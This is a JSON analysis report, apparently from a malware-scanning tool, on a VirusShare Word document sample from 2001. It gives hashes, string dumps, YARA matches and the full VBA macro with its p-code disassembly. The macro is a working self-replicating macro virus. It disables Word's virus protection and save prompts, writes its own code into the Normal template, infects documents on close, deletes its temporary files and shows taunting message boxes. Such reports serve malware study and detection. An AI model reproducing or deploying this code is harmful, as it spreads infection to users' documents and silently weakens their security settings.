{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "CodeModule": "May attempt to modify the VBA code",
            "Document_Close": "Runs when the Word document is closed",
            "Document_New": "Runs when a new Word document is created",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Kill": "May delete a file",
            "Open": "May open a file",
            "Output": "May write to a file",
            "Print #": "May write to a file",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code",
            "Windows": "May enumerate application windows"
        },
        "macro": "Private Sub Document_Close()\nVersion = 0.24\n' \u010e\u00ee\u00f7\u013a\u011b\u00f3 \u0148\u0171 \u00ed\u013a \u0144\u0119\u0155\u00e7\u0155\u00eb \u00c1\u013a-\u00c1\u013a ???\n    On Error Resume Next\n    s = ActiveDocument.Saved\n    Application.EnableCancelKey = Not -1\n    With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With\n    Randomize\n        Open NormalTemplate.Path & \"\\Normal.dat\" For Output As #1\n        Open NormalTemplate.Path & \"\\License.dat\" For Output As #2\n        For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines\n            a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)\n            Print #1, a\n            If i = 2 Then Print #2, a\n        Next i\n        Close #1\n        Close #2\n    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> \"Private Sub Document_Close()\" Then\n        If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1), 7) <> \"Version\" Then\n            Set t = NormalTemplate.VBProject.VBComponents.Item(1)\n        End If\n    ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> \"Private Sub Document_Close()\" Then\n        Set t = ActiveDocument.VBProject.VBComponents.Item(1)\n    Else\n        t = \"\"\n    End If\n    If t <> \"\" Then\n        Open NormalTemplate.Path & \"\\Normal.dat\" For Input As #1\n        If LOF(1) = 0 Then GoTo q\n        i = 1\n        Do While Not EOF(1)\n            Line Input #1, a\n            t.CodeModule.InsertLines i, a\n            i = i + 1\n        Loop\nq:      Close #1\n        If Left(ActiveDocument.Name, 8) <> \"Document\" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName\n        If Rnd < 0.3 Then\n            a = MsgBox(\"You are lamer? Press OK to confirm\", vbOKOnly, \"Windows NT\")\n        End If\n    End If\n    Kill NormalTemplate.Path & \"\\Normal.dat\"\n    If Rnd < 0.05 Then\n        ActiveDocument.Content.InsertFile NormalTemplate.Path & \"\\License.dat\"\n        ActiveDocument.Save\n    End If\n    If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s\n    Kill NormalTemplate.Path & \"\\License.dat\"\nEnd Sub\n\nPrivate Sub Document_New()\n    a = MsgBox(\"\u010c \u00e7\u0155\u00f7\u013a\u011b \u0148\u013a\u00e1\u013a \u00fd\u0148\u00ee\u0148 \u010f\u00f3\u0144\u0148\u00ee\u00e9 \u00f4\u0155\u00e9\u00eb ???\", vbQuestion, \"WindowsNT\")\nEnd Sub\n\n' Processing file: VirusShare_1551d4de4eb3e5b831edac2a12f24ad6\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 4049 bytes\n' Line #0:\n' \tFuncDefn (Private Sub Document_Close())\n' Line #1:\n' \tLitR8 0x1EB8 0xEB85 0xB851 0x3FCE \n' \tSt Version \n' Line #2:\n' \tQuoteRem 0x0000 0x001E \" \u010e\u00ee\u00f7\u013a\u011b\u00f3 \u0148\u0171 \u00ed\u013a \u0144\u0119\u0155\u00e7\u0155\u00eb \u00c1\u013a-\u00c1\u013a ???\"\n' Line #3:\n' \tOnError (Resume Next) \n' Line #4:\n' \tLd ActiveDocument \n' \tMemLd Saved \n' \tSt s \n' Line #5:\n' \tLitDI2 0x0001 \n' \tUMi \n' \tNot \n' \tLd Application \n' \tMemSt EnableCancelKey \n' Line #6:\n' \tStartWithExpr \n' \tLd Options \n' \tWith \n' \tBoS 0x0000 \n' \tLitDI2 0x0000 \n' \tMemStWith ConfirmConversions \n' \tBoS 0x0000 \n' \tLitDI2 0x0000 \n' \tMemStWith VirusProtection \n' \tBoS 0x0000 \n' \tLitDI2 0x0000 \n' \tMemStWith SaveNormalPrompt \n' \tBoS 0x0000 \n' \tEndWith \n' Line #7:\n' \tArgsCall Read 0x0000 \n' Line #8:\n' \tLd NormalTemplate \n' \tMemLd Path \n' \tLitStr 0x000B \"\\Normal.dat\"\n' \tConcat \n' \tLitDI2 0x0001 \n' \tSharp \n' \tLitDefault \n' \tOpen (For Output)\n' Line #9:\n' \tLd NormalTemplate \n' \tMemLd Path \n' \tLitStr 0x000C \"\\License.dat\"\n' \tConcat \n' \tLitDI2 0x0002 \n' \tSharp \n' \tLitDefault \n' \tOpen (For Output)\n' Line #10:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd MacroContainer \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tFor \n' Line #11:\n' \tLd i \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd MacroContainer \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tSt a \n' Line #12:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLd a \n' \tPrintItemNL \n' Line #13:\n' \tLd i \n' \tLitDI2 0x0002 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitDI2 0x0002 \n' \tSharp \n' \tPrintChan \n' \tLd a \n' \tPrintItemNL \n' \tEndIf \n' Line #14:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #15:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tClose 0x0001 \n' Line #16:\n' \tLitDI2 0x0002 \n' \tSharp \n' \tClose 0x0001 \n' Line #17:\n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tLitStr 0x001C \"Private Sub Document_Close()\"\n' \tNe \n' \tIfBlock \n' Line #18:\n' \tLitDI2 0x0002 \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tLitDI2 0x0007 \n' \tArgsLd LBound 0x0002 \n' \tLitStr 0x0007 \"Version\"\n' \tNe \n' \tIfBlock \n' Line #19:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tSet t \n' Line #20:\n' \tEndIfBlock \n' Line #21:\n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tLitStr 0x001C \"Private Sub Document_Close()\"\n' \tNe \n' \tElseIfBlock \n' Line #22:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tSet t \n' Line #23:\n' \tElseBlock \n' Line #24:\n' \tLitStr 0x0000 \"\"\n' \tSt t \n' Line #25:\n' \tEndIfBlock \n' Line #26:\n' \tLd t \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tIfBlock \n' Line #27:\n' \tLd NormalTemplate \n' \tMemLd Path \n' \tLitStr 0x000B \"\\Normal.dat\"\n' \tConcat \n' \tLitDI2 0x0001 \n' \tSharp \n' \tLitDefault \n' \tOpen (For Input)\n' Line #28:\n' \tLitDI2 0x0001 \n' \tArgsLd LOF 0x0001 \n' \tLitDI2 0x0000 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tGoTo q \n' \tEndIf \n' Line #29:\n' \tLitDI2 0x0001 \n' \tSt i \n' Line #30:\n' \tLitDI2 0x0001 \n' \tArgsLd EOF 0x0001 \n' \tNot \n' \tDoWhile \n' Line #31:\n' \tLitDI2 0x0001 \n' \tLd a \n' \tLineInput \n' Line #32:\n' \tLd i \n' \tLd a \n' \tLd t \n' \tMemLd CodeModule \n' \tArgsMemCall InsertLines 0x0002 \n' Line #33:\n' \tLd i \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt i \n' Line #34:\n' \tLoop \n' Line #35:\n' \tLabel q \n' \tLitDI2 0x0001 \n' \tSharp \n' \tClose 0x0001 \n' Line #36:\n' \tLd ActiveDocument \n' \tMemLd New \n' \tLitDI2 0x0008 \n' \tArgsLd LBound 0x0002 \n' \tLitStr 0x0008 \"Document\"\n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLd ActiveDocument \n' \tMemLd FullName \n' \tParamNamed FileName \n' \tLd ActiveDocument \n' \tArgsMemCall SaveAs 0x0001 \n' \tEndIf \n' Line #37:\n' \tLd Rnd \n' \tLitR8 0x3333 0x3333 0x3333 0x3FD3 \n' \tLt \n' \tIfBlock \n' Line #38:\n' \tLitStr 0x0022 \"You are lamer? Press OK to confirm\"\n' \tLd vbOKOnly \n' \tLitStr 0x000A \"Windows NT\"\n' \tArgsLd MsgBox 0x0003 \n' \tSt a \n' Line #39:\n' \tEndIfBlock \n' Line #40:\n' \tEndIfBlock \n' Line #41:\n' \tLd NormalTemplate \n' \tMemLd Path \n' \tLitStr 0x000B \"\\Normal.dat\"\n' \tConcat \n' \tArgsCall Kill 0x0001 \n' Line #42:\n' \tLd Rnd \n' \tLitR8 0x999A 0x9999 0x9999 0x3FA9 \n' \tLt \n' \tIfBlock \n' Line #43:\n' \tLd NormalTemplate \n' \tMemLd Path \n' \tLitStr 0x000C \"\\License.dat\"\n' \tConcat \n' \tLd ActiveDocument \n' \tMemLd Content \n' \tArgsMemCall InsertFile 0x0001 \n' Line #44:\n' \tLd ActiveDocument \n' \tArgsMemCall Save 0x0000 \n' Line #45:\n' \tEndIfBlock \n' Line #46:\n' \tLd ActiveDocument \n' \tMemLd Saved \n' \tLd s \n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLd s \n' \tLd ActiveDocument \n' \tMemSt Saved \n' \tEndIf \n' Line #47:\n' \tLd NormalTemplate \n' \tMemLd Path \n' \tLitStr 0x000C \"\\License.dat\"\n' \tConcat \n' \tArgsCall Kill 0x0001 \n' Line #48:\n' \tEndSub \n' Line #49:\n' Line #50:\n' \tFuncDefn (Private Sub Document_New())\n' Line #51:\n' \tLitStr 0x0021 \"\u010c \u00e7\u0155\u00f7\u013a\u011b \u0148\u013a\u00e1\u013a \u00fd\u0148\u00ee\u0148 \u010f\u00f3\u0144\u0148\u00ee\u00e9 \u00f4\u0155\u00e9\u00eb ???\"\n' \tLd vbQuestion \n' \tLitStr 0x0009 \"WindowsNT\"\n' \tArgsLd MsgBox 0x0003 \n' \tSt a \n' Line #52:\n' \tEndSub \n"
    },
    "filename": "VirusShare_1551d4de4eb3e5b831edac2a12f24ad6",
    "filesize": 29696,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.10, Code page: 1250, Author: Pavel, Template: Normal.dot, Last Saved By: Pavel, Revision Number: 2, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Wed Jun  6 00:40:00 2001, Last Saved Time/Date: Wed Jun  6 00:40:00 2001, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "1551d4de4eb3e5b831edac2a12f24ad6",
        "sha1": "26b858fd05ca2c88c38579f82b072ae85042b596",
        "sha256": "94307bb616cd23053e247518a43ffed11f728eed59c5488a5c0285a59396150a"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj",
            ". A!",
            "h0Vfh0Vf",
            "Pavel",
            "Normal.dot",
            "Pavel",
            "Microsoft Word 8.0",
            "Grisoft",
            "Title",
            "_PID_GUID",
            "     - ???D",
            "\\Normal.dat",
            "\\License.dat",
            "Private Sub Document_Close()",
            "Version",
            "Private Sub Document_Close()",
            "\\Normal.dat",
            "Document",
            "333333?\t",
            "You are lamer? Press OK to confirm ",
            "Windows NT$",
            "\\Normal.dat",
            "\\License.dat",
            "\\License.dat",
            "      ???",
            "WindowsNT",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VCreata",
            "`False",
            "Predecl",
            "xTru",
            "\"Expose",
            "Template Deriv",
            "$Customiz",
            "8 Sub ",
            "t_Cl",
            "Version",
            "H0.24",
            " ???",
            "On Err@or Res PNext",
            "$Act",
            "5.SaW",
            "Applica\"t",
            "8.EnRCancelKey",
            "@Not -1",
            "W@ith Op",
            ": .Confirm",
            "vW30",
            "VirusProte",
            "End ",
            "RandJ",
            "Open #",
            "[.Pa",
            ".dat\"",
            " F>Output As #,",
            "License",
            ".2C%",
            "i,1 ",
            "To Macro",
            "=tainer.4VB@4j",
            "mpons.I@tem(1)IdeModule",
            "@untOfL",
            "(ix, 1",
            "n\"tB, a",
            "If A32 ThW\t2\t i",
            " <> \"",
            "Leftr(",
            "1), 7)",
            "*Set W",
            "ls&I&ntM",
            "a!\"wa#",
            "tb)-",
            "LOFK`kf0CXGorq",
            "Do Whi",
            "A)Z ",
            "#PetxIrtb/ `nL",
            "i + Loo p",
            "!XL1, 8w",
            "R%) L",
            "Ful.l",
            "R@< 80.3",
            "Box(\"You",
            " @ lr? ",
            "ss OK t",
            "o cC\", v",
            "bOKOnly,",
            " \"Wiws xNT\"\u0211^ ",
            "e`Kxill]]",
            "YpX.",
            "PLs\t",
            "wp+{_",
            "em{\ta",
            "Q>NewC",
            "Qxues}",
            "73b1d6dfe",
            "WordS1 ",
            "VBA ",
            "Win16",
            "Win32",
            "Mac ",
            "doc1_ ",
            "stdole` ",
            "MSFormsC",
            "ThisDocument< ",
            "_Evaluate",
            "Normal ",
            "Office",
            "Project- ",
            "Documentj ",
            "Document_Close7\\ ",
            "Version ",
            "ActiveDocument\\ ",
            "Savedd ",
            "Application* ",
            "EnableCancelKey ",
            "Options ",
            "ConfirmConversions",
            "VirusProtectionoD ",
            "SaveNormalPrompt\u02bc ",
            "NormalTemplateq ",
            "Path2",
            "MacroContainer> ",
            "VBProjectOh ",
            "VBComponents",
            "Itemz ",
            "CodeModule",
            "CountOfLines!\\ ",
            "Lines ",
            "LOFc ",
            "EOF ",
            "InsertLines ",
            "SaveAsf; ",
            "FileNamej ",
            "FullName\u041e ",
            "RndR ",
            "MsgBoxR ",
            "vbOKOnly ",
            "Kill ",
            "Contentl ",
            "InsertFileX ",
            "Save ",
            "Document_New<E ",
            "vbQuestion ",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "c2.tlb#O",
            "LE Autom`ation",
            "mMSForms",
            "0427CA0-",
            "5A1C-11D 5-BD5",
            "56C31397",
            "3.TWD#M",
            "icrosoft ",
            "` Ob",
            " LibraryG",
            "P3,PJP\\VHBE\\(EX(",
            "CxN@UalCxNTax",
            " +\t,C",
            "OfficDO@`f",
            "G{2DF8",
            "C-5BFA-1H01B",
            "fE5@AA@4DE52",
            "PROGRAM ",
            "FILES\\MI",
            "CROSOFT OFFICE\\",
            "MSO97.DLLHk# 8.0k\"",
            "BThisDocument",
            "h@6s",
            "ThisDocument",
            "ID=\"{E7351EF7-5A1C-11D5-BD50-005056C31397}\"",
            "Document=ThisDocument/&H00000000",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"4E4CE3A71F5B795F795F795F795F\"",
            "DPB=\"ACAE0105016202620262\"",
            "GC=\"0A08A7EB04EC04ECFB\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=0, 0, 0, 0, C",
            "dokument Microsoft Word",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {
            "\\License.dat": "Data",
            "\\Normal.dat": "Data"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.394692",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
